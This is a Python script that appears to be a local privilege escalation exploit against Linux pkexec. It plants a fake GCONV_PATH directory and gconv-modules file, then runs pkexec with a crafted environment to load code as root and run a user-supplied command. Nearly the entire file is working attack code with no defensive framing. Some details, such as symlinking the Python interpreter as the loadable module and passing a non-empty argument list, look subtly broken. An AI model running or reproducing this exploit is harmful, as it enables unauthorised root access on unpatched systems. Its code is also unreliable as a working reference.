import os
import stat
import shutil

def remove_path(p):
    try:
        if os.path.isdir(p) and not os.path.islink(p):
            shutil.rmtree(p)
        else:
            os.remove(p)
    except Exception as e:
        print(f"[-] Failed to remove {p}: {e}")

def recursive_remove(p):
    if not os.path.exists(p):
        return
    for root, dirs, files in os.walk(p, topdown=False):
        for name in files + dirs:
            remove_path(os.path.join(root, name))
    remove_path(p)

try:
    os.mkdir("GCONV_PATH=.", 0o777)
except FileExistsError:
    pass

try:
    # Bu satır root izni ister, sistem desteklemezse hata verir.
    os.mknod("GCONV_PATH=./.pkexec", stat.S_IFREG | 0o777)
except FileExistsError:
    pass
except PermissionError:
    print("[-] Permission denied: cannot create GCONV_PATH=./.pkexec")

try:
    os.mkdir(".pkexec", 0o777)
except FileExistsError:
    pass

with open(".pkexec/gconv-modules", "w") as f:
    f.write("module UTF-8// PKEXEC// pkexec 2")

try:
    target = os.readlink("/proc/self/exe")
    os.symlink(target, ".pkexec/pkexec.so")
except FileExistsError:
    pass
except OSError as e:
    print(f"[-] Failed to create symlink: {e}")

rpipe, wpipe = os.pipe()
pid = os.fork()

cmd = "CMD="+os.sys.argv[1] if len(os.sys.argv) > 1 else None

args = ["/usr/bin/pkexec"]
env = {
    "GCONV_PATH": ".pkexec",
    "PATH": "GCONV_PATH=.",
    "CHARSET": "pkexec",
    "SHELL": "pkexec",
}
if cmd:
    key, value = cmd.split("=", 1)
    env[key] = value

if pid != 0:
    # Parent process
    os.close(rpipe)
else:
    # Child process
    os.close(wpipe)
    try:
        data = os.read(rpipe, 1024).decode(errors="ignore")
    except Exception:
        data = ""
    if data.startswith("pkexec --version"):
        print("Exploit failed. Target is most likely patched.")
    recursive_remove("GCONV_PATH=.")
    recursive_remove(".pkexec")
    os._exit(0)

os.dup2(wpipe, 2)
os.close(wpipe)

try:
    os.execve("/usr/bin/pkexec", args, env)
except FileNotFoundError:
    # fallback
    os.execvpe("pkexec", args, env)
